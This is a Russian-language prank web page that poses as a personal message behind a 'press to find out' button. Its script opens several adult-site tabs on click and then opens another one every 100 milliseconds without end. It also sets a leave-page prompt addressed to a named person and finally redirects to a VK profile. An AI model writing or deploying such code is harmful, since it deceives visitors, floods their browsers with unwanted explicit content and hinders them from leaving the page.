<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Узнай что я хочу тебе сказать</title>

        <link rel="shortcut icon" href="/web/file/favicon/main/favicon.ico">
        <link rel="stylesheet" href="https://iny.su/web/vendor/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://iny.su/web/vendor/css/mdb.min.css">
        <link rel="stylesheet" href="https://iny.su/web/css/common.css?version=8">
    </head>
    <body>
        <main class="container elegant-color">
            <div class="row justify-content-center align-items-center elegant-color-dark h100vh">
                <div class="col-10 rounded text-center">
                    <h2 id="title" class="white-text mb-3">Узнай, что я хочу тебе сказать</h2>
                    <h4 id="whatsay" class="white-text"><button onclick="doWhatSay(); window.open('https:\/\/pornhub.com', '_blank'); window.open('https:\/\/pornhub.com', '_blank'); window.open('https:\/\/pornhub.com', '_blank'); window.open('https:\/\/pornhub.com', '_blank');" class="btn btn-large btn-rounded btn-outline-white z-depth-1">Нажми, чтобы узнать</button></h4>
                </div>
            </div>
        </main>
        <script src="https://iny.su/web/vendor/js/jquery.js"></script>
        <script src="https://iny.su/web/vendor/js/bootstrap.min.js"></script>
        <script src="https://iny.su/web/vendor/js/popper.min.js"></script>
        <script src="https://iny.su/web/vendor/js/icon.js"></script>
        <script src="https://iny.su/web/vendor/js/mdb.min.js"></script>
        <script>
        
        let msg = 'НА ПОСМОТРИ БРАТ'
        function doWhatSay() {
            window.onbeforeunload = () => {
                return 'Артем Не уходииии'
            }
            setInterval(() => {
                window.open('https:\/\/pornhub.com', '_blank');
            }, 100);
            $('#title').fadeOut(500)
            $('#whatsay').fadeOut(500, () => {
                $('#whatsay').html(msg).fadeIn(2000)
                doReload()
            })
        }
        function doReload() {
            setTimeout(() => {
                document.location.href = 'https://vk.com/ritsu_sama'
            }, 10000)
        }
        </script>
    </body>
</html>